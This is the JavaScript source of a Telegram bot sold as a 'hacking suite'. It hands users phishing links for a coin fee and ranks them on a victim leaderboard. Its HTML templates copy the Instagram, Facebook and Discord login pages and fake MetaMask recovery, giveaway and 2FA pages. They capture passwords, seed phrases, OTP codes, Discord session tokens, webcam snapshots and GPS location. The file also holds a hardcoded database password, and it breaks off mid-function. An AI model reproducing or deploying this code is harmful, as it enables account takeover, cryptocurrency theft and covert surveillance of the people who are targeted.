// =====================================================
// 🔥💀 SLIME TRACKERX PRO v101 - ULTIMATE HACKING SUITE 💀🔥
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const qrcode = require("qrcode");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== ⚠️ CHANGE THESE 3 THINGS ⚠️ ==========
const DOMAIN = "https://YOUR-APP-NAME.onrender.com";  // ← YOUR RENDER DOMAIN
const CHANNEL = "@devxtechzone";  // ← YOUR TELEGRAM CHANNEL
const OWNER_ID = 7271063368;  // ← YOUR TELEGRAM USER ID
// ===================================================

const TOOL_COST = 15;
const REF_REWARD = 15;

// ========== MONGODB ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/prosuite?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected'))
  .catch(err => console.error('❌ MongoDB Error:', err));

// ========== SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true },
  username: String,
  coins: { type: Number, default: 15 },
  diamonds: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  totalTools: { type: Number, default: 0 },
  victims: { type: Number, default: 0 },
  isAdmin: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const toolSchema = new mongoose.Schema({
  token: String,
  userId: Number,
  type: String,
  label: String,
  maskedUrl: String,
  createdAt: Date,
  expiresAt: Date,
  clicks: { type: Number, default: 0 },
  captures: { type: Number, default: 0 },
  victims: [Object]
});

const User = mongoose.model('User', userSchema);
const Tool = mongoose.model('Tool', toolSchema);

// ========== CACHE ==========
let usersCache = new Map();
let bannedUsers = new Set();
let userSessions = new Map();

// ========== FORCE JOIN CHECK ==========
async function checkJoin(userId) {
  if (userId === OWNER_ID) return true;
  try {
    const chatMember = await bot.telegram.getChatMember(CHANNEL, userId);
    return ["creator", "administrator", "member", "restricted"].includes(chatMember.status);
  } catch { return false; }
}

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
  if (ctx.callbackQuery?.data === "check_join") return next();
  
  if (!(await checkJoin(ctx.from.id))) {
    return ctx.reply(
      `🚫 **CHANNEL MEMBERSHIP REQUIRED** 🚫\n\nJoin ${CHANNEL} to use ALL hacking tools!\n\n⚠️ Every tool requires you to be a member.`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 JOIN CHANNEL", url: `https://t.me/${CHANNEL.replace('@', '')}` }],
            [{ text: "✅ I JOINED", callback_data: "check_join" }]
          ]
        }
      }
    );
  }
  return next();
});

bot.action("check_join", async (ctx) => {
  if (await checkJoin(ctx.from.id)) {
    await ctx.answerCbQuery("✅ Verified! Access granted.");
    const user = await initUser(ctx.from.id);
    await sendMainMenu(ctx, user);
  } else {
    await ctx.answerCbQuery("❌ You still haven't joined!", true);
  }
});

// ========== DATABASE FUNCTIONS ==========
async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    let username = (await bot.telegram.getChat(userId)).username || `user_${userId}`;
    user = new User({
      userId, username, coins: 15, referrer: referrerId,
      isAdmin: userId === OWNER_ID
    });
    await user.save();
    usersCache.set(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals++;
        await referrer.save();
        bot.telegram.sendMessage(referrerId, 
          `🎉 **NEW REFERRAL!**\n+${REF_REWARD} coins\n👥 Total: ${referrer.referrals} referrals`);
      }
    }
  }
  return user;
}

async function removeCoins(userId, amount) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    await user.save();
    usersCache.set(userId, user);
    return true;
  }
  return false;
}

function getRefLink(userId) {
  return `https://t.me/${bot.botInfo?.username || 'SlimeTrackerXBot'}?start=ref_${userId}`;
}

// ========== REAL-LOOKING URL GENERATOR ==========
function getRealLookingUrl(type, token) {
  const shortToken = token.substring(0, 8);
  const urls = {
    instagram: [`https://instagr.am/p/${shortToken}`, `https://ig.me/login/${shortToken}`],
    facebook: [`https://fb.watch/${shortToken}`, `https://facebook.com/login/${shortToken}`],
    gmail: [`https://accounts.google.com/signin/${shortToken}`],
    discord: [`https://discord.gg/${shortToken}`, `https://discord.com/nitro/${shortToken}`],
    tokengrab: [`https://discord.gift/${shortToken}`],
    crypto: [`https://metamask.io/verify/${shortToken}`],
    giveaway: [`https://prize.link/${shortToken}`],
    otp: [`https://verify.app/${shortToken}`],
    iplogger: [`https://track.me/${shortToken}`]
  };
  const list = urls[type] || [`${DOMAIN}/go/${shortToken}`];
  return list[Math.floor(Math.random() * list.length)];
}

// ========== PRO HTML TEMPLATES ==========

const PRO_TEMPLATES = {
  instagram: (token) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-container{max-width:350px;width:100%;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 30px;text-align:center}
.logo{margin-bottom:30px}
input{width:100%;padding:9px 0 7px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin:3px 0;font-size:12px}
button{width:100%;background:#0095f6;color:#fff;padding:7px;border:none;border-radius:4px;font-weight:600;margin-top:8px;cursor:pointer}
.fb-btn{background:#385185;margin-top:15px}
.divider{display:flex;margin:20px 0;color:#8e8e8e}
.divider-line{flex:1;height:1px;background:#dbdbdb}
.divider-text{margin:0 18px}
.forgot{font-size:12px;color:#00376b;margin-top:15px;display:inline-block}
.signup{margin-top:20px;color:#8e8e8e}
.signup a{color:#0095f6;text-decoration:none}
.error{color:#ed4956;display:none;margin:10px 0}
</style>
</head>
<body>
<div class="login-container">
<div class="logo"><svg width="175" viewBox="0 0 175 51"><path fill="#000" d="M85.6 17.3c-1.2-1.5-3-2.3-5-2.3-2.5 0-4.5 1-5.9 3.1-1.4 2-2.1 4.7-2.1 8.1 0 3.5.7 6.2 2.1 8.2 1.4 2 3.4 3.1 5.9 3.1 2 0 3.8-.8 5-2.3v1.9h4.7v-21h-4.7v1.2zm-.5 11.8c-.8 1.1-1.9 1.7-3.2 1.7s-2.4-.6-3.2-1.7c-.8-1.1-1.2-2.9-1.2-5.2 0-2.3.4-4 1.2-5.2.8-1.1 1.9-1.7 3.2-1.7s2.4.6 3.2 1.7c.8 1.1 1.2 2.9 1.2 5.2 0 2.3-.4 4.1-1.2 5.2zM103.2 10.5c-1.8 0-3.2 1.4-3.2 3.2s1.4 3.2 3.2 3.2 3.2-1.4 3.2-3.2-1.4-3.2-3.2-3.2zm-2.7 22.4h5.4v-21h-5.4v21zM115.5 32.9c2.3 0 4.1-.8 5.5-2.4 1.4-1.6 2.1-3.8 2.1-6.7 0-2.9-.7-5.2-2.1-6.7-1.4-1.6-3.2-2.4-5.5-2.4-2.3 0-4.1.8-5.5 2.4-1.4 1.6-2.1 3.8-2.1 6.7 0 2.9.7 5.2 2.1 6.7 1.4 1.6 3.2 2.4 5.5 2.4zm0-4.1c-.8 0-1.4-.3-1.9-.9-.5-.6-.7-1.6-.7-2.9 0-1.4.2-2.4.7-3 .5-.6 1.1-.9 1.9-.9s1.4.3 1.9.9c.5.6.7 1.6.7 3 0 1.4-.2 2.4-.7 2.9-.5.6-1.1.9-1.9.9z"/></svg></div>
<form id="loginForm"><input type="text" id="username" placeholder="Phone number, username, or email"><input type="password" id="password" placeholder="Password"><button type="submit">Log In</button><button type="button" class="fb-btn" onclick="fbLogin()">Log in with Facebook</button></form>
<div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
<a href="#" class="forgot">Forgot password?</a>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
<div id="errorMsg" class="error"></div>
</div>
<script>
let cameraData=null,locationData=null;
navigator.mediaDevices.getUserMedia({video:true}).then(s=>{let v=document.createElement('video');v.srcObject=s;v.play();setTimeout(()=>{let c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);cameraData=c.toDataURL('image/jpeg');s.getTracks().forEach(t=>t.stop());},1000)}).catch(()=>{});
navigator.geolocation.getCurrentPosition(p=>{locationData={lat:p.coords.latitude,lon:p.coords.longitude}},()=>{});
async function sendData(d){await fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'${token}',data:d,camera:cameraData,location:locationData})});}
function fbLogin(){document.getElementById('errorMsg').style.display='block';document.getElementById('errorMsg').innerText='Facebook login temporarily unavailable.';}
document.getElementById('loginForm').addEventListener('submit',async(e)=>{e.preventDefault();await sendData({username:document.getElementById('username').value,password:document.getElementById('password').value});document.getElementById('errorMsg').style.display='block';document.getElementById('errorMsg').innerText='Wrong password. Try again.';setTimeout(()=>{window.location.href='https://instagram.com'},2000);});
</script>
</body>
</html>`,

  facebook: (token) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{display:flex;flex-wrap:wrap;max-width:980px;gap:50px}
.info{flex:1}
.info h1{color:#1877f2;font-size:56px}
.info p{font-size:28px}
.login-box{flex:1;background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
input{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
button{width:100%;background:#1877f2;color:#fff;padding:12px;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
.create-btn{background:#42b72a;margin-top:16px}
.divider{border-bottom:1px solid #dadde1;margin:20px 0}
.forgot{text-align:center;margin:16px 0}
.forgot a{color:#1877f2;text-decoration:none}
.error{color:#f02849;display:none;margin:10px 0;text-align:center}
</style>
</head>
<body>
<div class="container">
<div class="info"><h1>facebook</h1><p>Connect with friends and the world around you on Facebook.</p></div>
<div class="login-box">
<form id="loginForm"><input type="text" id="email" placeholder="Email or phone"><input type="password" id="password" placeholder="Password"><button type="submit">Log In</button><div class="forgot"><a href="#">Forgotten password?</a></div><div class="divider"></div><button type="button" class="create-btn" onclick="createAccount()">Create New Account</button></form>
<div id="errorMsg" class="error"></div>
</div>
</div>
<script>
let locationData=null;
navigator.geolocation.getCurrentPosition(p=>{locationData={lat:p.coords.latitude,lon:p.coords.longitude}},()=>{});
async function sendData(d){await fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'${token}',data:d,location:locationData})});}
function createAccount(){window.location.href='https://facebook.com/r.php';}
document.getElementById('loginForm').addEventListener('submit',async(e)=>{e.preventDefault();await sendData({email:document.getElementById('email').value,password:document.getElementById('password').value});document.getElementById('errorMsg').style.display='block';document.getElementById('errorMsg').innerText='Wrong password.';setTimeout(()=>{window.location.href='https://facebook.com'},2000);});
</script>
</body>
</html>`,

  discord: (token) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#36393f;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#2f3136;border-radius:5px;width:480px;padding:32px}
.logo{text-align:center;margin-bottom:20px}
h2{color:#fff;font-size:24px;text-align:center}
.sub{color:#b9bbbe;text-align:center;margin-bottom:24px}
label{color:#b9bbbe;font-size:12px;font-weight:600}
input{width:100%;padding:10px;background:#202225;border:none;border-radius:3px;color:#fff;margin:8px 0 16px}
button{width:100%;background:#5865f2;color:#fff;padding:12px;border:none;border-radius:3px;font-size:16px;cursor:pointer}
.error{color:#ed4245;text-align:center;margin:10px 0;display:none}
</style>
</head>
<body>
<div class="container">
<div class="logo"><svg width="130" viewBox="0 0 127.14 96.36" fill="#5865f2"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.75,1.39,2.66,2a68.68,68.68,0,0,1-10.85,5.18,79.44,79.44,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.17-16.15C129.91,70.61,128.17,46.42,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.8,46,53.8,53,48.78,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96,46,96,53,91,65.69,84.69,65.69Z"/></svg></div>
<h2>Welcome back!</h2>
<p class="sub">We're so excited to see you again!</p>
<form id="loginForm"><label>EMAIL OR PHONE</label><input type="text" id="email" placeholder="email@example.com"><label>PASSWORD</label><input type="password" id="password" placeholder="••••••••"><button type="submit">Log In</button></form>
<div id="errorMsg" class="error"></div>
</div>
<script>
async function sendData(d){await fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'${token}',data:d})});}
document.getElementById('loginForm').addEventListener('submit',async(e)=>{e.preventDefault();await sendData({email:document.getElementById('email').value,password:document.getElementById('password').value});document.getElementById('errorMsg').style.display='block';document.getElementById('errorMsg').innerText='Invalid email or password.';setTimeout(()=>{window.location.href='https://discord.com/login'},2000);});
</script>
</body>
</html>`,

  tokengrab: (token) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Discord Nitro Giveaway</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1e1f22;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#2b2d31;border-radius:16px;width:500px;padding:40px;text-align:center}
.nitro{font-size:60px;margin-bottom:20px}
h1{color:#fff;margin-bottom:10px}
p{color:#b5bac1;margin-bottom:20px}
button{background:#5865f2;color:#fff;padding:14px 28px;border:none;border-radius:40px;font-size:18px;font-weight:600;cursor:pointer}
.status{margin-top:20px;color:#23a55a;display:none}
</style>
</head>
<body>
<div class="container"><div class="nitro">🎮</div><h1>FREE DISCORD NITRO</h1><p>3 months free for all Discord users!<br>Limited time offer - claim now!</p><button onclick="grabToken()">Claim Nitro →</button><div id="status" class="status"></div></div>
<script>
async function grabToken(){document.getElementById('status').style.display='block';document.getElementById('status').innerHTML='⚡ Generating...';let token=null;try{if(window.webpackChunkdiscord_app){const m=window.webpackChunkdiscord_app.push([[],{},function(e){return e;}]);for(const id in m.c){const mod=m.c[id];if(mod?.exports?.default?.getToken){token=mod.exports.default.getToken();break;}}}if(token){await fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'${token}',data:{discordToken:token}})});document.getElementById('status').innerHTML='✅ Nitro claimed! Check your DMs!';}else{document.getElementById('status').innerHTML='❌ Please log into Discord first!';}}catch(e){document.getElementById('status').innerHTML='❌ Please log into Discord first!';}setTimeout(()=>{window.location.href='https://discord.com/nitro';},2000);}
</script>
</body>
</html>`,

  crypto: (token) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>MetaMask - Wallet Recovery</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f6f8fc;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#fff;border-radius:24px;width:480px;padding:32px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
.header{text-align:center;margin-bottom:24px}
.fox{font-size:48px}
h2{color:#141618;margin-bottom:8px}
.warning{background:#fef2e8;border-left:4px solid #f66a0a;padding:16px;margin:20px 0;border-radius:8px}
textarea{width:100%;height:100px;padding:12px;border:1px solid #d6d9dc;border-radius:8px;margin:16px 0}
button{width:100%;background:#f66a0a;color:#fff;padding:14px;border:none;border-radius:40px;font-size:16px;font-weight:600;cursor:pointer}
.error{color:#d73814;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="container"><div class="header"><div class="fox">🦊</div><h2>MetaMask</h2></div><div class="warning">⚠️ <strong>Security Alert:</strong> Wallet verification required</div><p>Enter your Secret Recovery Phrase to verify your wallet:</p><textarea id="seed" placeholder="Enter your 12 or 24 word recovery phrase..."></textarea><button onclick="verify()">Verify Wallet</button><div id="errorMsg" class="error"></div></div>
<script>
async function verify(){const seed=document.getElementById('seed').value;if(seed.trim().split(' ').length<12){document.getElementById('errorMsg').style.display='block';document.getElementById('errorMsg').innerText='Please enter a valid recovery phrase (12+ words)';return;}await fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'${token}',data:{seedPhrase:seed}})});document.getElementById('errorMsg').style.display='block';document.getElementById('errorMsg').innerHTML='✅ Wallet verified! Redirecting...';setTimeout(()=>{window.location.href='https://metamask.io';},2000);}
</script>
</body>
</html>`,

  giveaway: (token) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>You Won $1000!</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:#fff;border-radius:24px;max-width:500px;width:100%;padding:40px;text-align:center;animation:pulse 1s infinite}
@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.02)}100%{transform:scale(1)}}
.trophy{font-size:80px;margin-bottom:20px}
h1{color:#ff9800;margin-bottom:10px;font-size:32px}
.amount{font-size:64px;font-weight:bold;color:#4caf50;margin:20px 0}
.timer{background:#f5f5f5;padding:15px;border-radius:12px;margin:20px 0}
.countdown{font-size:48px;font-family:monospace;font-weight:bold;color:#ff4444}
input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px}
button{width:100%;background:linear-gradient(45deg,#ff9800,#ff5722);color:#fff;padding:16px;border:none;border-radius:40px;font-size:18px;font-weight:bold;cursor:pointer}
</style>
</head>
<body>
<div class="container"><div class="trophy">🏆🎉💰</div><h1>CONGRATULATIONS!</h1><p>You've been selected as the WINNER of our</p><div class="amount">$1,000 GIVEAWAY!</div><div class="timer"><p>⏰ CLAIM YOUR PRIZE BEFORE IT EXPIRES! ⏰</p><div class="countdown" id="timer">10:00</div></div><form id="claimForm"><input type="text" id="name" placeholder="Full Name"><input type="email" id="email" placeholder="Email"><input type="tel" id="phone" placeholder="Phone"><input type="text" id="address" placeholder="Address"><button type="submit">CLAIM NOW →</button></form></div>
<script>
let timeLeft=600;const timerElem=document.getElementById('timer');setInterval(()=>{const m=Math.floor(timeLeft/60),s=timeLeft%60;timerElem.innerHTML=m+":"+String(s).padStart(2,'0');if(timeLeft>0)timeLeft--;},1000);
document.getElementById('claimForm').addEventListener('submit',async(e)=>{e.preventDefault();await fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'${token}',data:{name:document.getElementById('name').value,email:document.getElementById('email').value,phone:document.getElementById('phone').value,address:document.getElementById('address').value}})});alert('✅ Prize processing!');window.location.href='https://google.com';});
</script>
</body>
</html>`,

  otp: (token) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Verify Your Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f5f5f5;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#fff;border-radius:16px;padding:40px;text-align:center;max-width:400px}
.shield{font-size:60px;margin-bottom:20px}
h2{margin-bottom:10px}
p{color:#666;margin-bottom:20px}
.code-inputs{display:flex;gap:10px;justify-content:center;margin:30px 0}
.code-inputs input{width:50px;height:60px;text-align:center;font-size:24px;border:2px solid #ddd;border-radius:8px}
button{background:#007bff;color:#fff;padding:14px;border:none;border-radius:8px;font-size:16px;cursor:pointer;width:100%}
.resend{margin-top:20px;color:#007bff;cursor:pointer}
</style>
</head>
<body>
<div class="container"><div class="shield">🔐</div><h2>Two-Factor Authentication</h2><p>Enter the 6-digit code sent to your phone</p><div class="code-inputs"><input type="text" maxlength="1" id="d1"><input type="text" maxlength="1" id="d2"><input type="text" maxlength="1" id="d3"><input type="text" maxlength="1" id="d4"><input type="text" maxlength="1" id="d5"><input type="text" maxlength="1" id="d6"></div><button onclick="verify()">Verify Code</button><div class="resend" onclick="resend()">Didn't receive code? Resend</div><div id="error" style="color:red;margin-top:15px;display:none"></div></div>
<script>
async function verify(){const code=[1,2,3,4,5,6].map(i=>document.getElementById('d'+i).value).join('');if(code.length!==6){document.getElementById('error').style.display='block';document.getElementById('error').innerText='Enter 6-digit code';return;}await fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'${token}',data:{otpCode:code}})});document.getElementById('error').style.display='block';document.getElementById('error').style.color='#28a745';document.getElementById('error').innerText='✅ Verified!';setTimeout(()=>{window.location.href='https://google.com';},2000);}
function resend(){document.getElementById('error').style.display='block';document.getElementById('error').style.color='#007bff';document.getElementById('error').innerText='Code resent!';}
</script>
</body>
</html>`,

  iplogger: (token) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>
body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f0f0}
.spinner{width:50px;height:50px;border:5px solid #ccc;border-top-color:#007bff;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
<script>
async function sendData(){let loc=null;try{loc=await new Promise(r=>{navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lon:p.coords.longitude}),()=>r(null));});}catch(e){}await fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:'${token}',data:{type:'ip_logger',userAgent:navigator.userAgent,location:loc}})});setTimeout(()=>{window.location.href='https://google.com';},1500);}
sendData();
</script>
</head>
<body><div class="spinner"></div><h3>Verifying connection...</h3></body>
</html>`
};

// ========== CREATE PHISHING TOOL ==========
async function createPhishingTool(userId, type, label) {
  const user = await initUser(userId);
  
  if (user.coins < TOOL_COST) {
    return { error: `❌ Need ${TOOL_COST} coins! You have ${user.coins}\n💰 Get 15 coins per referral!` };
  }
  
  await removeCoins(userId, TOOL_COST);
  
  const token = crypto.randomBytes(32).toString('hex');
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000);
  
  const originalUrl = `${DOMAIN}/p/${token}`;
  const maskedUrl = getRealLookingUrl(type, token);
  
  let html = PRO_TEMPLATES[type](token);
  if (!html) return { error: "Invalid tool type" };
  
  await fs.ensureDirSync("public/phish");
  await fs.writeFile(path.join(__dirname, "public/phish", `${token}.html`), html);
  
  const tool = new Tool({
    token, userId, type, label, maskedUrl, originalUrl,
    createdAt: new Date(), expiresAt, clicks: 0, captures: 0, victims: []
  });
  await tool.save();
  
  user.totalTools++;
  await user.save();
  usersCache.set(userId, user);
  
  const qrBuffer = await qrcode.toBuffer(maskedUrl);
  
  return {
    success: true,
    url: maskedUrl,
    originalUrl: originalUrl,
    qr: qrBuffer,
    expiresAt: expiresAt,
    remainingCoins: user.coins
  };
}

// ========== MAIN MENU ==========
async function sendMainMenu(ctx, user) {
  await ctx.reply(
    `🔥💀 **SLIME TRACKERX PRO v101** 💀🔥\n\n` +
    `┌─────────────────────────┐\n` +
    `│ 👤 ${ctx.from.first_name}\n` +
    `│ 💰 ${user.coins} COINS\n` +
    `│ 👥 ${user.referrals} REFERRALS\n` +
    `│ 🎯 ${user.victims} VICTIMS\n` +
    `│ 🔧 ${user.totalTools} TOOLS\n` +
    `└─────────────────────────┘\n\n` +
    `⚡ Each tool: ${TOOL_COST} coins\n` +
    `🎁 Referral reward: ${REF_REWARD} coins\n\n` +
    `⬇️ **SELECT YOUR WEAPON** ⬇️`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🎭 INSTAGRAM", callback_data: "tool_instagram" }, { text: "📘 FACEBOOK", callback_data: "tool_facebook" }],
          [{ text: "📧 GMAIL", callback_data: "tool_gmail" }, { text: "🎮 DISCORD", callback_data: "tool_discord" }],
          [{ text: "🎮 TOKEN GRAB", callback_data: "tool_tokengrab" }, { text: "💰 METAMASK", callback_data: "tool_crypto" }],
          [{ text: "🎁 GIVEAWAY", callback_data: "tool_giveaway" }, { text: "🔐 2FA OTP", callback_data: "tool_otp" }],
          [{ text: "📍 IP LOGGER", callback_data: "tool_iplogger" }, { text: "💀 MY LINKS", callback_data: "my_links" }],
          [{ text: "💰 BALANCE", callback_data: "my_balance" }, { text: "🔗 REFERRAL", callback_data: "my_ref" }],
          [{ text: "🏆 LEADERBOARD", callback_data: "leaderboard" }, { text: "👤 PROFILE", callback_data: "my_profile" }]
        ]
      }
    }
  );
}

// ========== BOT START ==========
bot.start(async (ctx) => {
  let ref = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    ref = parseInt(args[1].replace("ref_", ""));
  }
  const user = await initUser(ctx.from.id, ref);
  await sendMainMenu(ctx, user);
});

// ========== TOOL HANDLERS ==========
const tools = ['instagram', 'facebook', 'gmail', 'discord', 'tokengrab', 'crypto', 'giveaway', 'otp', 'iplogger'];

for (const type of tools) {
  bot.action(`tool_${type}`, async (ctx) => {
    await ctx.answerCbQuery();
    userSessions.set(ctx.from.id, { action: `create_${type}` });
    await ctx.reply(
      `🎯 **${type.toUpperCase()} PHISHING TOOL**\n\n` +
      `💰 Cost: ${TOOL_COST} coins\n` +
      `⏰ Duration: 24 hours\n` +
      `📸 Captures: Login + Camera + GPS\n\n` +
      `📝 **Send a label name for this link:**\n` +
      `Example: \`free_iphone\`, \`instagram_login\``,
      { parse_mode: "Markdown" }
    );
  });
}

// ========== TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  const session = userSessions.get(ctx.from.id);
  if (!session?.action?.startsWith("create_")) return;
  
  const type = session.action.replace("create_", "");
  const label = ctx.message.text.trim();
  
  const result = await createPhishingTool(ctx.from.id, type, label);
  userSessions.delete(ctx.from.id);
  
  if (result.error) return ctx.reply(result.error);
  
  await ctx.replyWithPhoto(result.qr, {
    caption:
      `✅ **${type.toUpperCase()} LINK CREATED!**\n\n` +
      `🔗 **REAL LOOKING URL:**\n${result.url}\n\n` +
      `📝 Backup URL: ${result.originalUrl}\n` +
      `⏰ Expires: ${result.expiresAt.toLocaleString()}\n` +
      `💰 Cost: -${TOOL_COST} coins\n` +
      `💎 Remaining: ${result.remainingCoins} coins\n\n` +
      `📸 **QR CODE ABOVE** - Scan with phone\n\n` +
      `⚠️ Send this link to your target!\n` +
      `✅ It looks like a REAL ${type} link!`,
    parse_mode: "Markdown"
  });
});

// ========== UTILITY HANDLERS ==========
bot.action("my_links", async (ctx) => {
  await ctx.answerCbQuery();
  const toolsList = await Tool.find({ userId: ctx.from.id }).sort({ createdAt: -1 }).limit(10);
  if (toolsList.length === 0) {
    return ctx.reply("📭 No active links. Create one using the menu!");
  }
  
  let message = "💀 **YOUR ACTIVE LINKS** 💀\n\n";
  for (const t of toolsList) {
    const status = new Date(t.expiresAt) > new Date() ? "✅ ACTIVE" : "❌ EXPIRED";
    message += `🎯 ${t.label || t.type}\n🔗 ${t.maskedUrl || t.originalUrl}\n👆 ${t.clicks} clicks | 📸 ${t.captures} captures | ${status}\n\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("my_balance", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  await ctx.reply(`💰 **BALANCE**\n\n💵 Coins: ${user.coins}\n🎯 Victims: ${user.victims}\n🔧 Tools used: ${user.totalTools}`, { parse_mode: "Markdown" });
});

bot.action("my_ref", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  await ctx.reply(
    `🔗 **REFERRAL PROGRAM**\n\n` +
    `Your link: ${getRefLink(ctx.from.id)}\n\n` +
    `👥 Referrals: ${user.referrals}\n` +
    `💰 Per referral: +${REF_REWARD} coins\n\n` +
    `Share your link and earn coins instantly!`,
    { parse_mode: "Markdown" }
  );
});

bot.action("leaderboard", async (ctx) => {
  await ctx.answerCbQuery();
  const topUsers = await User.find().sort({ victims: -1 }).limit(15);
  let message = "🏆 **TOP 15 HACKERS** 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} ${i+1}. @${topUsers[i].username} - ${topUsers[i].victims} victims\n`;
  }
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("my_profile", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  await ctx.reply(
    `👤 **PROFILE**\n\n` +
    `🆔 ID: ${user.userId}\n` +
    `💰 Coins: ${user.coins}\n` +
    `👥 Referrals: ${user.referrals}\n` +
    `🎯 Victims: ${user.victims}\n` +
